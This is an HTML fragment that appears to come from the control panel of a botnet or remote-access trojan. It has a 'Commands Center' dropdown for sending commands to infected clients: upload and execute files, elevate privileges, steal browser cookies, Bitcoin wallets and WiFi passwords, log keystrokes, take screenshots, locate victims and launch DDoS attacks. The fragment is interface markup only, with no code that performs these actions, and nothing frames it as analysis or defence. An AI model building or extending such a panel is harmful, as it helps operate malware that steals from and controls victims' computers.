<div class="col">
  <div class="card mb-3">
    <div class="card-header">
      <i class="fas  fa-wrench"></i>
      Commands Center
    </div>
    <div class="card-body">
      <div class="table-responsive pb-4">
        <table class="table table-bordered" width="100%" cellspacing="0">
          <thead>
            <tr>
              <th>Command</th>
              <th>Execute</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td>
                <select class="form-control" id="command" name="command">
                  <option value="nocommand" selected>Select Command</option>
                  <optgroup label="Clients Commands">
                    <option value="ping">Ping</option>
                    <option value="uploadf">Upload & Execute File</option>
                    <option value="msgbox">Show Messagebox</option>
                    <option value="tkschot">Take Screenshot</option>
                    <option value="stealps">Installed Softwares</option>
                    <option value="exec">Execute Script</option>
                    <option value="elev">Elevate User Status</option>
                    <option value="tempclean">Clean TEMP Folder</option>
                  </optgroup>
                  <optgroup label="Location">
                    <option value="getlocation">Get Location Information</option>
                    <option value="showlocation">Show Location On Map</option>
                  </optgroup>				  
                  <optgroup label="Stealers">
                    <option value="stealcookie">Steal Firefox Cookies</option>
                    <option value="stealchcookie">Steal Chrome Cookies</option>
                    <option value="stealbtc">Steal Bitcoin Wallet</option>
                    <option value="stealwifi">Steal WiFi Saved Password</option>
                  </optgroup>
                  <optgroup label="Open Webpage">
                    <option value="openwp">Open Webpage (Visible)</option>
                  </optgroup>
                  <optgroup label="DDOS Attack">
                    <option value="ddosw">Start DDOS</option>
                    <option value="stopddos">Stop DDOS</option>
                  </optgroup>
                  <optgroup label="Keylogger">
                    <option value="startkl">Start Keylogger</option>
                    <option value="stopkl">Stop Keylogger</option>
                    <option value="getlogs">Retreive Logs</option>
                  </optgroup>
                  <optgroup label="Computer Commands">
                    <option value="shutdown">Shutdown</option>
                    <option value="restart">Restart</option>
                    <option value="logoff">Logoff</option>
                  </optgroup>
                  <optgroup label="Clients Connection">
                    <option value="close">Close Connection</option>
                    <option value="moveclient">Move Client</option>
                    <option value="blacklist">Blacklist IP</option>
                    <option value="update">Update Client</option>
                    <option value="restart">Restart Client</option>
                    <option value="uninstall">Uninstall</option>
                  </optgroup>
                </select>
              </td>
              <td>
                <button type="submit" name="Form1" for="Form1" class="btn btn-block btn-dark">
                  Send Command
                </button>
              </td>
            </tr>
          </tbody>
        </table>
      </div>
    </div>
  </div>
</div>